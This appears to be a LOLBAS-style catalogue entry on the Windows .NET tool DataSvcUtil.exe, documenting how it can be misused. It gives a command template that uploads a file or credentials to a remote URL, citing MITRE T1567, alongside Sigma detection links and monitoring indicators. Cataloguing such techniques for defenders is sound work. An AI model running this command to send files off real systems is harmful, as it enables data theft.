      document_utf8: "---\nName: DataSvcUtil.exe\nDescription: DataSvcUtil.exe is a command-line tool\
        \ provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates\
        \ the client data service classes that are needed to access a data service from a .NET Framework\
        \ client application.\nAuthor: Ialle Teixeira\nCreated: 2020-12-01\nCommands:\n  - Command: DataSvcUtil\
        \ /out:{PATH_ABSOLUTE} /uri:{REMOTEURL}\n    Description: Upload file, credentials or data exfiltration\
        \ in general\n    Usecase: Upload file\n    Category: Upload\n    Privileges: User\n    MitreID:\
        \ T1567\n    OperatingSystem: Windows 10\nFull_Path:\n  - Path: C:\\Windows\\Microsoft.NET\\Framework64\\\
        v3.5\\DataSvcUtil.exe\nCode_Sample:\n  - Code: https://gist.github.com/teixeira0xfffff/837e5bfed0d1b0a29a7cb1e5dbdd9ca6\n\
        Detection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_data_exfiltration_by_using_datasvcutil.yml\n\
        \  - IOC: The DataSvcUtil.exe tool is installed in the .NET Framework directory.\n  - IOC: Preventing/Detecting\
        \ DataSvcUtil with non-RFC1918 addresses by Network IPS/IDS.\n  - IOC: Monitor process creation\
        \ for non-SYSTEM and non-LOCAL SERVICE accounts launching DataSvcUtil.\nResources:\n  - Link:\
        \ https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/wcf-data-service-client-utility-datasvcutil-exe\n\
        \  - Link: https://docs.microsoft.com/en-us/dotnet/framework/data/wcf/generating-the-data-service-client-library-wcf-data-services\n\
